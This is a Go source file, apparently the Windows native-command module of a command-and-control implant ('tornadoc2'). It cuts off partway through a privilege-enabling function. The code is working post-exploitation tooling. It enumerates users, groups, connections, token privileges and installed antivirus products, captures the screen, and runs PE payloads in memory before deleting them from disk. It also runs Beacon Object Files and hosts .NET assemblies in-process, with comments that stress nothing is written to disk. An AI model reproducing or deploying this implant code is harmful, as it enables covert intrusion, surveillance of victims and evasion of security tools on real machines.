//go:build windows

package native

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"tornadoc2/agent/protocol"
)

type (
	Task   = protocol.Task
	Result = protocol.Result
)

func NativeID() (string, error) {
	u, err := user.Current()
	if err != nil {
		return "", err
	}
	return fmt.Sprintf(
		"username=%s uid=%s gid=%s\n",
		u.Username, u.Uid, u.Gid,
	), nil
}

func NativePS() (string, error) {
	cmd := exec.Command("tasklist", "/FO", "CSV", "/NH")
	cmd.Env = sanitizedEnv()
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("PID      COMMAND\n")
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.Split(line, "\",\"")
		if len(parts) < 2 {
			continue
		}
		name := strings.TrimPrefix(parts[0], "\"")
		pid := parts[1]
		sb.WriteString(name)
		if len(name) < 8 {
			sb.WriteString(strings.Repeat(" ", 8-len(name)))
		}
		sb.WriteString(" ")
		sb.WriteString(pid)
		sb.WriteByte('\n')
	}
	return sb.String(), nil
}

func NativeStatExtra(_ string) string { return "" }

func NativeDF(args []string) (string, error) {
	path := "C:\\"
	if len(args) > 0 {
		path = args[0]
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel32.NewProc("GetDiskFreeSpaceExW")

	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return "", err
	}
	var freeAvail, total, totalFree uint64
	r, _, errno := proc.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(unsafe.Pointer(&freeAvail)),
		uintptr(unsafe.Pointer(&total)),
		uintptr(unsafe.Pointer(&totalFree)),
	)
	if r == 0 {
		return "", errno
	}
	used := total - totalFree
	usePct := 0.0
	if total > 0 {
		usePct = float64(used) * 100 / float64(total)
	}
	return fmt.Sprintf(
		"Path       : %s\n"+
			"Total      : %d bytes (%.1f GiB)\n"+
			"Used       : %d bytes (%.1f GiB)\n"+
			"Available  : %d bytes (%.1f GiB)\n"+
			"Use%%       : %.1f%%\n",
		path,
		total, float64(total)/(1<<30),
		used, float64(used)/(1<<30),
		freeAvail, float64(freeAvail)/(1<<30),
		usePct,
	), nil
}

func NativeUptime() (string, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel32.NewProc("GetTickCount64")
	r, _, _ := proc.Call()
	secs := r / 1000
	days := int(secs) / 86400
	hours := (int(secs) % 86400) / 3600
	mins := (int(secs) % 3600) / 60
	return fmt.Sprintf("up %d day(s), %d hour(s), %d minute(s) (%d seconds)\n",
		days, hours, mins, int(secs)), nil
}

func ExecPEInMemory(ctx context.Context, path string,
	args []string) (string, int, error) {

	raw, err := os.ReadFile(path)
	if err != nil {
		return "", -1, fmt.Errorf("read payload: %w", err)
	}
	_ = os.Remove(path)

	_ = ctx
	_ = args

	out, code, err := ExecutePEInProcess(raw, 60000)
	if err != nil {
		return "", -1, err
	}
	return out, code, nil
}

func ExecELFInMemory(_ context.Context, _ string,
	_ []string) (string, int, error) {
	return "", -1, errors.New("elf in-memory execution requires a Linux target")
}

func ExecBOF(ctx context.Context, bofBytes []byte,
	entry string, packedArgs []byte) (string, int, error) {

	_ = ctx

	if entry == "" {
		entry = "go"
	}
	return ExecuteBOFInProcess(bofBytes, entry, packedArgs)
}

// ExecuteAssemblyInProcess runs a .NET assembly in the beacon's
// own process via CLR hosting. Nothing is written to disk and no
// child process is created. The entryType and entryMethod must
// be supplied by the caller; an assembly without a known entry
// point should be Donut-wrapped and run through the shellcode
// path instead.
func ExecuteAssemblyInProcess(assembly []byte,
	entryType, entryMethod, args string) (string, int, error) {
	return ExecuteDotNetAssemblyInProcess(
		assembly, entryType, entryMethod, args)
}

var (
	iphlpapi = syscall.NewLazyDLL("iphlpapi.dll")

	procGetExtendedTcpTable = iphlpapi.NewProc("GetExtendedTcpTable")
	procGetExtendedUdpTable = iphlpapi.NewProc("GetExtendedUdpTable")
	procGetIpNetTable       = iphlpapi.NewProc("GetIpNetTable")
	procGetIpForwardTable   = iphlpapi.NewProc("GetIpForwardTable")
)

const (
	afInet = 2 // AF_INET

	tcpTableOwnerPidAll = 5
	udpTableOwnerPid    = 1
)

func winTcpStateName(s uint32) string {
	switch s {
	case 1:
		return "CLOSED"
	case 2:
		return "LISTEN"
	case 3:
		return "SYN_SENT"
	case 4:
		return "SYN_RCVD"
	case 5:
		return "ESTABLISHED"
	case 6:
		return "FIN_WAIT1"
	case 7:
		return "FIN_WAIT2"
	case 8:
		return "CLOSE_WAIT"
	case 9:
		return "CLOSING"
	case 10:
		return "LAST_ACK"
	case 11:
		return "TIME_WAIT"
	case 12:
		return "DELETE_TCB"
	}
	return fmt.Sprintf("STATE_%d", s)
}

func winIPv4AndPort(addr, port uint32) string {
	ip := net.IPv4(
		byte(addr&0xFF),
		byte((addr>>8)&0xFF),
		byte((addr>>16)&0xFF),
		byte((addr>>24)&0xFF))
	p := uint16(port>>8) | uint16(port<<8)
	return fmt.Sprintf("%s:%d", ip.String(), p)
}

func NativeNetstat(t Task) (string, error) {
	var sb strings.Builder
	sb.WriteString("Proto  Local Address                " +
		"Remote Address               State         PID\n")

	// TCP
	var size uint32
	procGetExtendedTcpTable.Call(
		0,
		uintptr(unsafe.Pointer(&size)),
		0,
		afInet,
		tcpTableOwnerPidAll,
		0)
	if size > 0 {
		buf := make([]byte, size)
		r, _, _ := procGetExtendedTcpTable.Call(
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(unsafe.Pointer(&size)),
			0,
			afInet,
			tcpTableOwnerPidAll,
			0)
		if r == 0 && len(buf) >= 4 {
			n := binary.LittleEndian.Uint32(buf[0:4])
			const rowSize = 24
			for i := uint32(0); i < n; i++ {
				off := 4 + i*rowSize
				if int(off+rowSize) > len(buf) {
					break
				}
				state := binary.LittleEndian.Uint32(buf[off:])
				la := binary.LittleEndian.Uint32(buf[off+4:])
				lp := binary.LittleEndian.Uint32(buf[off+8:])
				ra := binary.LittleEndian.Uint32(buf[off+12:])
				rp := binary.LittleEndian.Uint32(buf[off+16:])
				pid := binary.LittleEndian.Uint32(buf[off+20:])
				fmt.Fprintf(&sb, "%-5s  %-27s %-27s %-13s %d\n",
					"tcp",
					winIPv4AndPort(la, lp),
					winIPv4AndPort(ra, rp),
					winTcpStateName(state),
					pid)
			}
		}
	}

	// UDP — different API, same two-call pattern
	size = 0
	procGetExtendedUdpTable.Call(
		0,
		uintptr(unsafe.Pointer(&size)),
		0,
		afInet,
		udpTableOwnerPid,
		0)
	if size > 0 {
		buf := make([]byte, size)
		r, _, _ := procGetExtendedUdpTable.Call(
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(unsafe.Pointer(&size)),
			0,
			afInet,
			udpTableOwnerPid,
			0)
		if r == 0 && len(buf) >= 4 {
			n := binary.LittleEndian.Uint32(buf[0:4])
			const rowSize = 12
			for i := uint32(0); i < n; i++ {
				off := 4 + i*rowSize
				if int(off+rowSize) > len(buf) {
					break
				}
				la := binary.LittleEndian.Uint32(buf[off:])
				lp := binary.LittleEndian.Uint32(buf[off+4:])
				pid := binary.LittleEndian.Uint32(buf[off+8:])
				addr := winIPv4AndPort(la, lp)
				// trim the ":0" from the remote side
				fmt.Fprintf(&sb, "%-5s  %-27s %-27s %-13s %d\n",
					"udp", addr, "*:*", "UNCONN", pid)
			}
		}
	}
	return sb.String(), nil
}

func NativeArp(t Task) (string, error) {
	var size uint32
	procGetIpNetTable.Call(
		0,
		uintptr(unsafe.Pointer(&size)),
		0)
	if size == 0 {
		return "Address          HWaddress           Type    Iface\n", nil
	}

	buf := make([]byte, size)
	r, _, _ := procGetIpNetTable.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
		0)
	if r != 0 {
		return "", fmt.Errorf("GetIpNetTable: status %d", r)
	}
	if len(buf) < 4 {
		return "", nil
	}

	n := binary.LittleEndian.Uint32(buf[0:4])
	const rowSize = 24

	var sb strings.Builder
	sb.WriteString("Address          HWaddress           Type    Iface\n")
	for i := uint32(0); i < n; i++ {
		off := 4 + i*rowSize
		if int(off+rowSize) > len(buf) {
			break
		}
		ifaceIdx := binary.LittleEndian.Uint32(buf[off:])
		phyLen := binary.LittleEndian.Uint32(buf[off+4:])
		if phyLen > 8 {
			phyLen = 8
		}
		hw := make([]byte, phyLen)
		copy(hw, buf[off+8:off+8+phyLen])
		addrRaw := binary.LittleEndian.Uint32(buf[off+16:])
		typ := binary.LittleEndian.Uint32(buf[off+20:])

		ip := net.IPv4(
			byte(addrRaw&0xFF),
			byte((addrRaw>>8)&0xFF),
			byte((addrRaw>>16)&0xFF),
			byte((addrRaw>>24)&0xFF))

		typeName := map[uint32]string{
			1: "other", 2: "invalid", 3: "dynamic", 4: "static",
		}[typ]
		if typeName == "" {
			typeName = fmt.Sprintf("type_%d", typ)
		}

		hwStr := make([]string, len(hw))
		for j, b := range hw {
			hwStr[j] = fmt.Sprintf("%02x", b)
		}

		fmt.Fprintf(&sb, "%-16s %-19s %-7s %d\n",
			ip.String(),
			strings.Join(hwStr, "-"),
			typeName, ifaceIdx)
	}
	return sb.String(), nil
}

func NativeRoute(t Task) (string, error) {
	var size uint32
	procGetIpForwardTable.Call(
		0,
		uintptr(unsafe.Pointer(&size)),
		0)
	if size == 0 {
		return "Destination      Netmask          Gateway          Iface  Metric\n", nil
	}

	buf := make([]byte, size)
	r, _, _ := procGetIpForwardTable.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
		0)
	if r != 0 {
		return "", fmt.Errorf("GetIpForwardTable: status %d", r)
	}
	if len(buf) < 4 {
		return "", nil
	}

	n := binary.LittleEndian.Uint32(buf[0:4])
	const rowSize = 56

	var sb strings.Builder
	sb.WriteString("Destination      Netmask          Gateway          Iface  Metric\n")
	for i := uint32(0); i < n; i++ {
		off := 4 + i*rowSize
		if int(off+rowSize) > len(buf) {
			break
		}
		dest := binary.LittleEndian.Uint32(buf[off:])
		mask := binary.LittleEndian.Uint32(buf[off+4:])
		nextHop := binary.LittleEndian.Uint32(buf[off+12:])
		iface := binary.LittleEndian.Uint32(buf[off+16:])
		metric := binary.LittleEndian.Uint32(buf[off+36:])

		ipFrom := func(v uint32) string {
			return net.IPv4(
				byte(v&0xFF),
				byte((v>>8)&0xFF),
				byte((v>>16)&0xFF),
				byte((v>>24)&0xFF)).String()
		}

		fmt.Fprintf(&sb, "%-16s %-16s %-16s %-6d %d\n",
			ipFrom(dest), ipFrom(mask), ipFrom(nextHop),
			iface, metric)
	}
	return sb.String(), nil
}

type winLuid struct {
	LowPart  uint32
	HighPart int32
}

const (
	winTokenQuery     = 0x0008
	winTokenPrivileges = 3

	privEnabledByDefault = 0x00000001
	privEnabled          = 0x00000002
	privRemoved          = 0x00000004
)

func NativeWhoamiPriv(t Task) (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	procOpenProcessToken := advapi32.NewProc("OpenProcessToken")
	procGetTokenInformation := advapi32.NewProc("GetTokenInformation")
	procLookupPrivilegeNameW := advapi32.NewProc("LookupPrivilegeNameW")
	procGetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	procCloseHandle := kernel32.NewProc("CloseHandle")

	var hToken uintptr
	hProcess, _, _ := procGetCurrentProcess.Call()
	r, _, errno := procOpenProcessToken.Call(
		hProcess,
		uintptr(winTokenQuery),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return "", fmt.Errorf("OpenProcessToken: %v", errno)
	}
	defer procCloseHandle.Call(hToken)

	var size uint32
	procGetTokenInformation.Call(
		hToken,
		uintptr(winTokenPrivileges),
		0,
		0,
		uintptr(unsafe.Pointer(&size)),
	)
	if size == 0 {
		return "", errors.New("GetTokenInformation: returned size 0")
	}

	buf := make([]byte, size)
	r, _, errno = procGetTokenInformation.Call(
		hToken,
		uintptr(winTokenPrivileges),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&size)),
	)
	if r == 0 {
		return "", fmt.Errorf("GetTokenInformation: %v", errno)
	}
	if len(buf) < 4 {
		return "", errors.New("token privileges buffer too small")
	}

	count := binary.LittleEndian.Uint32(buf[0:4])

	const entrySize = 12
	var sb strings.Builder
	sb.WriteString("Privilege Name                       State\n")
	sb.WriteString("==================================== ====================\n")

	for i := uint32(0); i < count; i++ {
		off := 4 + i*entrySize
		if int(off+entrySize) > len(buf) {
			break
		}
		luid := winLuid{
			LowPart:  binary.LittleEndian.Uint32(buf[off : off+4]),
			HighPart: int32(binary.LittleEndian.Uint32(buf[off+4 : off+8])),
		}
		attrs := binary.LittleEndian.Uint32(buf[off+8 : off+12])

		var nameLen uint32
		procLookupPrivilegeNameW.Call(
			0,
			uintptr(unsafe.Pointer(&luid)),
			0,
			uintptr(unsafe.Pointer(&nameLen)),
		)
		if nameLen == 0 {
			continue
		}
		nameBuf := make([]uint16, nameLen+1)
		r, _, _ = procLookupPrivilegeNameW.Call(
			0,
			uintptr(unsafe.Pointer(&luid)),
			uintptr(unsafe.Pointer(&nameBuf[0])),
			uintptr(unsafe.Pointer(&nameLen)),
		)
		if r == 0 {
			continue
		}
		name := syscall.UTF16ToString(nameBuf[:nameLen])

		state := "Disabled"
		switch {
		case attrs&privRemoved != 0:
			state = "Removed"
		case attrs&privEnabled != 0 && attrs&privEnabledByDefault != 0:
			state = "Enabled, Default"
		case attrs&privEnabled != 0:
			state = "Enabled"
		case attrs&privEnabledByDefault != 0:
			state = "Default"
		}
		fmt.Fprintf(&sb, "%-36s %s\n", name, state)
	}
	return sb.String(), nil
}

func utf16PtrToString(p uintptr) string {
	if p == 0 {
		return ""
	}
	var length int
	for *(*uint16)(unsafe.Pointer(p + uintptr(length*2))) != 0 {
		length++
	}
	if length == 0 {
		return ""
	}
	s := unsafe.Slice((*uint16)(unsafe.Pointer(p)), length)
	return syscall.UTF16ToString(s)
}

func NativeUsers(t Task) (string, error) {
	netapi32 := syscall.NewLazyDLL("netapi32.dll")
	procNetUserEnum := netapi32.NewProc("NetUserEnum")
	procNetApiBufferFree := netapi32.NewProc("NetApiBufferFree")

	const (
		filterNormalAccount = 0x0002
		maxPreferredLength  = 0xFFFFFFFF
	)

	var (
		bufPtr       uintptr
		entriesRead  uint32
		totalEntries uint32
		resumeHandle uintptr
	)

	r, _, _ := procNetUserEnum.Call(
		0,
		0,
		uintptr(filterNormalAccount),
		uintptr(unsafe.Pointer(&bufPtr)),
		uintptr(maxPreferredLength),
		uintptr(unsafe.Pointer(&entriesRead)),
		uintptr(unsafe.Pointer(&totalEntries)),
		uintptr(unsafe.Pointer(&resumeHandle)),
	)
	if r != 0 {
		return "", fmt.Errorf("NetUserEnum: status %d", r)
	}
	if bufPtr != 0 {
		defer procNetApiBufferFree.Call(bufPtr)
	}

	// USER_INFO_0 is a single LPWSTR pointer.
	ptrSize := unsafe.Sizeof(uintptr(0))

	var sb strings.Builder
	sb.WriteString("Username\n")
	sb.WriteString("================================\n")

	for i := uint32(0); i < entriesRead; i++ {
		entryOff := uintptr(i) * ptrSize
		namePtr := *(*uintptr)(unsafe.Pointer(bufPtr + entryOff))
		if namePtr == 0 {
			continue
		}
		sb.WriteString(utf16PtrToString(namePtr))
		sb.WriteByte('\n')
	}
	return sb.String(), nil
}

func NativeGroups(t Task) (string, error) {
	netapi32 := syscall.NewLazyDLL("netapi32.dll")
	procNetLocalGroupEnum := netapi32.NewProc("NetLocalGroupEnum")
	procNetApiBufferFree := netapi32.NewProc("NetApiBufferFree")

	const maxPreferredLength = 0xFFFFFFFF

	var (
		bufPtr       uintptr
		entriesRead  uint32
		totalEntries uint32
		resumeHandle uintptr
	)

	r, _, _ := procNetLocalGroupEnum.Call(
		0,
		0,
		uintptr(unsafe.Pointer(&bufPtr)),
		uintptr(maxPreferredLength),
		uintptr(unsafe.Pointer(&entriesRead)),
		uintptr(unsafe.Pointer(&totalEntries)),
		uintptr(unsafe.Pointer(&resumeHandle)),
	)
	if r != 0 {
		return "", fmt.Errorf("NetLocalGroupEnum: status %d", r)
	}
	if bufPtr != 0 {
		defer procNetApiBufferFree.Call(bufPtr)
	}

	// LOCALGROUP_INFO_0 is a single LPWSTR pointer.
	ptrSize := unsafe.Sizeof(uintptr(0))

	var sb strings.Builder
	sb.WriteString("Group\n")
	sb.WriteString("================================\n")

	for i := uint32(0); i < entriesRead; i++ {
		entryOff := uintptr(i) * ptrSize
		namePtr := *(*uintptr)(unsafe.Pointer(bufPtr + entryOff))
		if namePtr == 0 {
			continue
		}
		sb.WriteString(utf16PtrToString(namePtr))
		sb.WriteByte('\n')
	}
	return sb.String(), nil
}

type winGUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

var (
	clsidWbemLocator = winGUID{
		0x4590F811, 0x1D3A, 0x11D0,
		[8]byte{0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24},
	}
	iidWbemLocator = winGUID{
		0xDC12A687, 0x737F, 0x11CF,
		[8]byte{0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24},
	}
)

const (
	clsctxInprocServer = 0x1
	clsctxLocalServer  = 0x4
	coinitMultithreaded = 0x0
	wbemInfinite = 0xFFFFFFFF
	wbemFlagForwardOnly = 0x20

	vtI4   = 3
	vtUI4  = 19
	vtBSTR = 8
)

func comCall(obj uintptr, idx int, args ...uintptr) uintptr {
	vtbl := *(*uintptr)(unsafe.Pointer(obj))
	slot := vtbl + uintptr(idx)*unsafe.Sizeof(uintptr(0))
	fn := *(*uintptr)(unsafe.Pointer(slot))
	all := make([]uintptr, 0, 1+len(args))
	all = append(all, obj)
	all = append(all, args...)
	ret, _, _ := syscall.SyscallN(fn, all...)
	return ret
}

func comRelease(obj uintptr) {
	if obj != 0 {
		comCall(obj, 2) // IUnknown::Release
	}
}

func bstrPtrFromString(procSysAllocString *syscall.LazyProc, s string) uintptr {
	u, _ := syscall.UTF16FromString(s)
	p, _, _ := procSysAllocString.Call(uintptr(unsafe.Pointer(&u[0])))
	return p
}

func variantBSTR(obj, propBSTR uintptr) string {
	var v [24]byte
	hr := comCall(obj, 3, // IWbemClassObject::Get
		propBSTR,
		0,
		uintptr(unsafe.Pointer(&v[0])),
		0, 0,
	)
	if hr != 0 {
		return ""
	}
	if *(*uint16)(unsafe.Pointer(&v[0])) != vtBSTR {
		return ""
	}
	bstr := *(*uintptr)(unsafe.Pointer(&v[8]))
	if bstr == 0 {
		return ""
	}
	byteLen := *(*uint32)(unsafe.Pointer(bstr - 4))
	if byteLen < 2 {
		return ""
	}
	runes := unsafe.Slice((*uint16)(unsafe.Pointer(bstr)), byteLen/2)
	return syscall.UTF16ToString(runes)
}

// variantUint32 reads an I4 or UI4 property.
func variantUint32(obj, propBSTR uintptr) uint32 {
	var v [24]byte
	hr := comCall(obj, 3,
		propBSTR,
		0,
		uintptr(unsafe.Pointer(&v[0])),
		0, 0,
	)
	if hr != 0 {
		return 0
	}
	vt := *(*uint16)(unsafe.Pointer(&v[0]))
	if vt != vtI4 && vt != vtUI4 {
		return 0
	}
	return *(*uint32)(unsafe.Pointer(&v[8]))
}

// variantBSTRAny returns the first non-empty value found among
// the candidate property names. WQL property matching is
// case-insensitive; IWbemClassObject::Get is not. A class whose
// schema stores a property as "DisplayName" returns an object
// whose Get requires "DisplayName", even when the query that
// fetched it wrote "displayName". Supplying both spellings and
// taking the first hit closes that gap without needing to know
// which casing the local class definition chose.
func variantBSTRAny(obj uintptr, names ...uintptr) string {
	for _, n := range names {
		if n == 0 {
			continue
		}
		if s := variantBSTR(obj, n); s != "" {
			return s
		}
	}
	return ""
}

// variantUint32Any mirrors variantBSTRAny for I4/UI4 properties.
// A zero productState is never a valid AV registration state, so
// treating zero as "not found" and moving to the next candidate
// is safe. If every candidate misses, the caller gets zero — the
// same value the old single-name lookup returned on failure.
func variantUint32Any(obj uintptr, names ...uintptr) uint32 {
	for _, n := range names {
		if n == 0 {
			continue
		}
		if v := variantUint32(obj, n); v != 0 {
			return v
		}
	}
	return 0
}

func NativeAvList(t Task) (string, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	ole32 := syscall.NewLazyDLL("ole32.dll")
	oleaut32 := syscall.NewLazyDLL("oleaut32.dll")

	procCoInitializeEx := ole32.NewProc("CoInitializeEx")
	procCoCreateInstance := ole32.NewProc("CoCreateInstance")
	procCoUninitialize := ole32.NewProc("CoUninitialize")
	procSysAllocString := oleaut32.NewProc("SysAllocString")
	procSysFreeString := oleaut32.NewProc("SysFreeString")

	hr, _, _ := procCoInitializeEx.Call(0, uintptr(coinitMultithreaded))
	if uint32(hr) == 0 || uint32(hr) == 1 { // S_OK or S_FALSE
		defer procCoUninitialize.Call()
	}

	var pLocator uintptr
	hr, _, _ = procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsidWbemLocator)),
		0,
		uintptr(clsctxInprocServer|clsctxLocalServer),
		uintptr(unsafe.Pointer(&iidWbemLocator)),
		uintptr(unsafe.Pointer(&pLocator)),
	)
	if uint32(hr) != 0 {
		return "", fmt.Errorf(
			"av-list: CoCreateInstance(WbemLocator) hr=0x%08x",
			uint32(hr))
	}
	defer comRelease(pLocator)

	// IWbemLocator::ConnectServer — vtable index 3.
	ns := bstrPtrFromString(procSysAllocString,
		`ROOT\SecurityCenter2`)
	defer procSysFreeString.Call(ns)

	var pServices uintptr
	hr = comCall(pLocator, 3,
		ns,
		0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&pServices)),
	)
	if uint32(hr) != 0 {
		return "", fmt.Errorf(
			"av-list: ConnectServer hr=0x%08x (the "+
				"SecurityCenter2 namespace is absent on "+
				"Windows Server before 2016; try the "+
				"registry variant instead)", uint32(hr))
	}
	defer comRelease(pServices)

	// IWbemServices::ExecQuery — vtable index 20.
	lang := bstrPtrFromString(procSysAllocString, "WQL")
	defer procSysFreeString.Call(lang)
	query := bstrPtrFromString(procSysAllocString,
		"SELECT displayName, productState, "+
			"pathToSignedProductExe FROM AntiVirusProduct")
	defer procSysFreeString.Call(query)

	var pEnum uintptr
	hr = comCall(pServices, 20,
		lang,
		query,
		uintptr(wbemFlagForwardOnly),
		0,
		uintptr(unsafe.Pointer(&pEnum)),
	)
	if uint32(hr) != 0 {
		return "", fmt.Errorf(
			"av-list: ExecQuery hr=0x%08x", uint32(hr))
	}
	defer comRelease(pEnum)

	// Two spellings per property. The SecurityCenter2 provider
	// has shipped both casings across Windows versions, and the
	// WQL query above matches either because WQL is
	// case-insensitive. The Get call that reads the value back
	// is not, so both are supplied and the first hit wins.
	nameLower := bstrPtrFromString(procSysAllocString,
		"displayName")
	defer procSysFreeString.Call(nameLower)
	nameUpper := bstrPtrFromString(procSysAllocString,
		"DisplayName")
	defer procSysFreeString.Call(nameUpper)

	stateLower := bstrPtrFromString(procSysAllocString,
		"productState")
	defer procSysFreeString.Call(stateLower)
	stateUpper := bstrPtrFromString(procSysAllocString,
		"ProductState")
	defer procSysFreeString.Call(stateUpper)

	pathLower := bstrPtrFromString(procSysAllocString,
		"pathToSignedProductExe")
	defer procSysFreeString.Call(pathLower)
	pathUpper := bstrPtrFromString(procSysAllocString,
		"PathToSignedProductExe")
	defer procSysFreeString.Call(pathUpper)

	var sb strings.Builder
	sb.WriteString("Product                 State  Path\n")
	sb.WriteString("============================================================\n")

	rows := 0
	for {
		var pObj uintptr
		var returned uint32
		// IEnumWbemClassObject::Next — vtable index 4.
		hr = comCall(pEnum, 4,
			uintptr(wbemInfinite),
			1,
			uintptr(unsafe.Pointer(&pObj)),
			uintptr(unsafe.Pointer(&returned)),
		)
		if uint32(hr) != 0 || returned == 0 {
			break
		}
		name := variantBSTRAny(pObj, nameLower, nameUpper)
		state := variantUint32Any(pObj, stateLower, stateUpper)
		path := variantBSTRAny(pObj, pathLower, pathUpper)
		comRelease(pObj)

		if name == "" && path == "" && state == 0 {
			// The object was returned but no property
			// read matched any known spelling. This is
			// the class-schema drift case — the local
			// SecurityCenter2 provider uses different
			// property names than this client was
			// written against. Emit one diagnostic line
			// so the operator has something concrete
			// to report rather than a silent empty row.
			sb.WriteString(
				"(object returned but no known property " +
					"name matched; the local SecurityCenter2 " +
					"class uses a schema this client does " +
					"not recognise)\n")
			rows++
			continue
		}

		if name == "" {
			name = "(unnamed)"
		}
		if len(name) > 23 {
			name = name[:20] + "..."
		}
		fmt.Fprintf(&sb, "%-23s 0x%06x %s\n", name, state, path)
		rows++
	}

	if rows == 0 {
		sb.WriteString("(no AntiVirusProduct instances returned)\n")
	}
	return sb.String(), nil
}

var (
	user32Shot = syscall.NewLazyDLL("user32.dll")
	gdi32Shot  = syscall.NewLazyDLL("gdi32.dll")

	procGetDC             = user32Shot.NewProc("GetDC")
	procReleaseDC         = user32Shot.NewProc("ReleaseDC")
	procGetSystemMetrics  = user32Shot.NewProc("GetSystemMetrics")

	procCreateCompatibleDC     = gdi32Shot.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32Shot.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32Shot.NewProc("SelectObject")
	procBitBlt                 = gdi32Shot.NewProc("BitBlt")
	procDeleteObject           = gdi32Shot.NewProc("DeleteObject")
	procDeleteDC               = gdi32Shot.NewProc("DeleteDC")
	procGetDIBits              = gdi32Shot.NewProc("GetDIBits")
)

const (
	smCXScreen = 0
	smCYScreen = 1
	srcCopy    = 0x00CC0020
	dibRGB     = 0
	biRGB      = 0
)

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type rgbQuad struct {
	Blue, Green, Red, Reserved byte
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]rgbQuad
}

func NativeScreenshot(t Task) (string, error) {
	w, _, _ := procGetSystemMetrics.Call(uintptr(smCXScreen))
	h, _, _ := procGetSystemMetrics.Call(uintptr(smCYScreen))
	if w == 0 || h == 0 {
		return "", errors.New("screenshot: zero screen dimensions")
	}

	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return "", errors.New("screenshot: GetDC failed")
	}
	defer procReleaseDC.Call(0, hdcScreen)

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return "", errors.New("screenshot: CreateCompatibleDC failed")
	}
	defer procDeleteDC.Call(hdcMem)

	hbm, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, w, h)
	if hbm == 0 {
		return "", errors.New(
			"screenshot: CreateCompatibleBitmap failed")
	}
	defer procDeleteObject.Call(hbm)

	procSelectObject.Call(hdcMem, hbm)

	r, _, _ := procBitBlt.Call(hdcMem, 0, 0, w, h,
		hdcScreen, 0, 0, srcCopy)
	if r == 0 {
		return "", errors.New("screenshot: BitBlt failed")
	}

	bi := bitmapInfo{}
	bi.Header.Size = uint32(unsafe.Sizeof(bi.Header))
	bi.Header.Width = int32(w)
	bi.Header.Height = -int32(h) // negative => top-down DIB
	bi.Header.Planes = 1
	bi.Header.BitCount = 32
	bi.Header.Compression = biRGB
	bi.Header.SizeImage = uint32(w * h * 4)

	buf := make([]byte, int(w*h*4))
	r, _, _ = procGetDIBits.Call(
		hdcMem,
		hbm,
		0,
		h,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bi)),
		dibRGB,
	)
	if r == 0 {
		return "", errors.New("screenshot: GetDIBits failed")
	}

	img := image.NewRGBA(image.Rect(0, 0, int(w), int(h)))
	for y := 0; y < int(h); y++ {
		for x := 0; x < int(w); x++ {
			i := (y*int(w) + x) * 4
			img.SetRGBA(x, y, color.RGBA{
				R: buf[i+2],
				G: buf[i+1],
				B: buf[i+0],
				A: 255,
			})
		}
	}

	var out bytes.Buffer
	if err := png.Encode(&out, img); err != nil {
		return "", fmt.Errorf("screenshot: png encode: %w", err)
	}
	return base64.StdEncoding.EncodeToString(out.Bytes()), nil
}

func openAdjustableToken() (uintptr, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	kernel32 := syscall.NewLazyDLL("kernel32.dll")

	procOpenThreadToken := advapi32.NewProc("OpenThreadToken")
	procOpenProcessToken := advapi32.NewProc("OpenProcessToken")
	procGetCurrentThread := kernel32.NewProc("GetCurrentThread")
	procGetCurrentProcess := kernel32.NewProc("GetCurrentProcess")

	const (
		tokenAdjustPrivileges = 0x0020
		tokenQuery            = 0x0008
	)
	desired := uintptr(tokenAdjustPrivileges | tokenQuery)

	hThread, _, _ := procGetCurrentThread.Call()
	var hToken uintptr
	r, _, _ := procOpenThreadToken.Call(
		hThread,
		desired,
		0, // OpenAsSelf = FALSE => access check against impersonation
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r != 0 {
		return hToken, nil
	}

	hProcess, _, _ := procGetCurrentProcess.Call()
	r, _, errno := procOpenProcessToken.Call(
		hProcess,
		desired,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if r == 0 {
		return 0, fmt.Errorf("OpenProcessToken: %v", errno)
	}
	return hToken, nil
}

func enableBackupPrivilege(hToken uintptr) error {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procLookupPrivilegeValueW :=
